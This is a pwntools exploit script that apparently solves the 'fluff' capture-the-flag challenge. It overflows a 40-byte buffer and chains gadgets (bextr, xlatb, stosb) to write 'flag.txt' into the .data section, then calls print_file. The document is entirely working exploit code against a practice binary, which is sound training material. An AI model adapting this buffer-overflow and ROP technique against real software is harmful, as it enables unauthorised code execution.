from pwn import *

proc = process('./fluff')

payload = b'0' * 40

def mem_write(addr):
    payload = b''
    # 0x000000000040062a : pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
    payload += p64(0x000000000040062a)
    payload += p64(0x0000000000004000) # rdx -> start = rdx & 0xff -> size = rdx >> 8 & 0xff
    payload += p64(addr - 0x3ef2)      # rcx -> rbx = rcx (start + size - 1)
    # 0x0000000000400628 : xlatb ; ret (al = [rbx + al])
    payload += p64(0x0000000000400628)
    # 0x0000000000400639 : stosb byte ptr [rdi], al ; ret (rdi = al, rdi++)
    payload += p64(0x0000000000400639)
    return payload

# 0x00000000004006a3 : pop rdi ; ret
# data:0000000000601028 _data
payload += p64(0x00000000004006a3)
payload += p64(0x0000000000601028) # rdi

# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
payload += p64(0x0000000000400610)
payload += p64(0x0000000000000000) # rbp

# 66 6c 61 67 2e 74 78 74 = flag.txt
# 0x00000000004003c4 - 00 : 66
# 0x0000000000400239 - 66 : 6c
# 0x00000000004005d2 - 6c : 61
# 0x00000000004007a0 - 61 : 67
# 0x000000000040024e - 67 : 2e
# 0x0000000000400674 - 2e : 74
# 0x0000000000400246 - 74 : 78
# 0x0000000000400674 - 78 : 74

payload += mem_write(0x00000000004003c4 - 0x00)
payload += mem_write(0x0000000000400239 - 0x66)
payload += mem_write(0x00000000004005d2 - 0x6c)
payload += mem_write(0x00000000004007a0 - 0x61)
payload += mem_write(0x000000000040024e - 0x67)
payload += mem_write(0x0000000000400674 - 0x2e)
payload += mem_write(0x0000000000400246 - 0x74)
payload += mem_write(0x0000000000400674 - 0x78)

# 0x00000000004006a3 : pop rdi ; ret (should be set?)
payload += p64(0x00000000004006a3)
payload += p64(0x0000000000601028) # rdi

# .text:0000000000400620                 call    _print_file
payload += p64(0x0000000000400620)

with open("fluff.bin", "wb") as file:
    file.write(payload)

print(len(payload))

proc.sendline(payload)
proc.interactive()

